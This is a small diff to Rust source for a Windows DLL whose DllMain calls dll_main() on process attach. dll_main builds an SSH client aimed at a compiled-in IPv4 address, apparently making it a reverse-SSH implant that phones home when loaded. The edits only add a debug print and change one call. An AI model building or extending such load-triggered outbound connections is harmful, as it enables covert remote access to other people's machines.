@@ -120,7 +120,8 @@ pub async fn dll_main() {
     let config = russh::client::Config::default();
     let config = Arc::new(config);
     let sh = Client {};
-
+    debug_println!("dll_main");
+    
     let ssh_server_ip = String::from_utf8_lossy(SSH_CONNECT_IPV4_ADDRESS)
         .to_string()
         .trim_matches(char::from(0))
@@ -280,7 +281,7 @@ pub unsafe extern "system" fn DllMain(
         DLL_PROCESS_ATTACH => {
             // Code to run when the DLL is loaded into a process
             // Initialize resources, etc.
-            let _ = dll_main();
+            dll_main();
         }
         DLL_THREAD_ATTACH => {
             // Code to run when a new thread is created in the process
